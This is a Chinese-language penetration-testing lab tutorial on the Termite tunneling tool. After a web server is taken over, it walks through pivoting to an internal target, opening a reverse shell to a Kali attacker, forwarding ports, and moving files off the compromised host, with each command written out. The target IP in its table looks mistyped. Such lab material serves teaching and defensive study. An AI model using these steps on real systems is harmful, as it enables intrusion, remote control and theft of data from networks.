

### 通过Termite进行隧道穿透
Termite是一款内网穿透工具，该工具比较小巧不到1MB大小，但功能较为强大，分为管理端admin和客户端agent。它支持多平台、在复杂内网环境下Termite渗透适用性更强，操作也极为简便，下述以它为案例进行隧道穿透。实验拓扑如图1-1所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683850028-763344bd-37cf-4d0d-a3ca-8b485d7f117d.png#)<br />图1-1通过Termite进行隧道穿透<br />假设我们获取到Web服务器的权限后，想要对靶机获取权限，此时可以使用Termite工具进行隧道穿透，利用Termite工具下载靶机的核心文件，具体环境如表1-1所示，下面进行演示。<br />表1-1 Termite进行隧道穿透实验环境

| 主机类型 | IP配置 |
| --- | --- |
| Kali攻击机 | 192.168.0.58 |
| Web服务器 | 192.168.0.25   192.168.52.11 |
| 靶机 | 192.68.52.12 |

#### 1.目标在公网
    1）首先上传agent客户端到Web服务器，执行agent.exe -l 8888 ，开启监听Web服务器8888端口，如图1-2所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683850417-d7bd2ae2-0e7c-4e94-8afd-269fe77541fb.png#)<br />图1-2 监听Web服务器8888端口<br />    2）我们在Kali攻击机使用admin连接Web服务器开启的监听端口，执行./admin_linux_x86_64 -c 192.168.0.25 -p 8888命令，成功连接Web服务器后，使用show参数查看当前页面下存活的节点，如图1-3所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683850700-cceeaa1b-a354-49fe-9f7e-ce2b9e918b45.png#)<br />图1-3反向连接过程
#### 2.目标在内网
    假设通过Web服务器获取到靶机的系统执行权限，由于靶机位处于内网，且它无法访问外网，可以根据下面步骤进行操作。<br />    1）首先在Web服务器上传agent工具来开启监听8888端口，执行agent_Win32.exe -l 8888命令，开启监听，如图1-4所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683851042-5a7c9167-3a69-499a-b9a2-bdb8c1b601cc.png#)<br />图1-4 监听本地端口<br />    2）Kali攻击机使用admin服务端，执行./admin_linux_x86_64 -c 192.168.0.25 -p 8888命令连接Web服务器开启监听的8888端口。如图1-5所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683851352-85ea30dd-ee24-4810-accc-3ed477d99c06.png#)<br />图1-5 连接Web服务器<br />3）通过上传agent客户端到靶机，在靶机执行agent_win32.exe -c 192.168.52.11 -p 8888命令。注意，192.168.52.11是Web服务器内网的网卡。如图1-6所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683851770-5ed88c84-d01b-444d-95fc-cbd4af915e4b.png#)<br />图1-6 连接另一个网卡<br />4）此时在kali主机使用show命令查看，这里可以看到与靶机搭建隧道成功，下方会显示一个节点，如图1-7所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683852082-e33e6aa3-3926-4191-a9a3-e1f193c35759.png#)<br />图1-7隧道搭建成功
#### 3.shell反弹
  1）利用Termite工具根据上述环境进行shell反弹实验，将Web服务器的Shell反弹到Kali攻击机的1024端口，执行shell 1024命令即可，如图1-8所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683852551-4d703b00-38a6-48c7-8f79-d267eb1f2508.png#)<br />图1-8 shell反弹到本地1024端口<br />    2）在kali工具机使用nc工具进行测试， 执行nc 127.0.0.1 1024命令，可以看到已经将Web服务器的shell反弹到攻击机，如图1-9所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683852938-d266e22a-16ac-4da3-bd0a-1da86effb846.png#)<br />图1-9 shell反弹成功
#### 4.端口转发
    1）利用Termite工具的lcxtran 参数进行端口转发操作，lcxtran参数使用方法即“lcxtran 本地端口 目标ip 目标端口”，使用goto命令先进入Web服务器节点，然后执行lcxtran 8080 192.168.0.25 80，此时可以将Web服务器的80端口，转发到kali攻击机的8080端口，如图1-10所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683853220-3df74595-1519-406d-9a31-9af8b7cf678f.png#)<br />图1-10端口转发<br />2）我们访问kali攻击机本地的8080端口，即可访问Web服务器的80端口服务，如图1-11所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683853596-6f117e00-8a2e-4204-ab04-c25ee3b85d0c.png#)<br />图1-11访问Web服务器
#### 5.上传下载文件
Termite工具也可以用于上传下载文件，admin包含upfile上传参数使用方法，使用方法也很简单，使用参数即“upfile 本地文件路径 目标路径”，downfile下载参数使用方法即“downfile 目标文件路径 本地存放路径”。<br />1）使用Kali攻击机上传file.txt文件到Web服务器，利用Termite工具的upfile参数，先使用goto 1命令进入节点，执行upfile /boot/1.txt  C:\1.txt 命令将目录下的1.txt文件上传到Web服务器的C盘下。如图1-12所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683853871-88e18cff-fae2-40d6-8991-fa69604f508b.png#)<br />图1-12下载文件<br />  2）在Web服务器使用命令行工具，进入C盘，dir查看当前目录，此时发现1.txt已经上传成功，如图1-13所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683854169-e8496973-0fbc-44bc-8f5c-03f3e2f446be.png#)<br />图1-13 C盘目录<br />3）当需要下载Web服务器的文件，使用Termite工具的downfile参数，执行“downfile C:\1.txt  /1.txt”命令，即可将C盘下的1.txt文件下载到Kali的根目录下，如图1-14所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683854440-ce616c4e-2599-41f5-a3a3-409d6ecaf6ab.png#)<br />图1-14下载到kali的根目录下<br />4）在根目录下使用ls命令显示下载的文件，下载成功如图1-15所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683854697-ab3a9fa8-1de1-4791-b8e7-eceb1c61d096.png#)<br />图1-15 查看根目录下文件

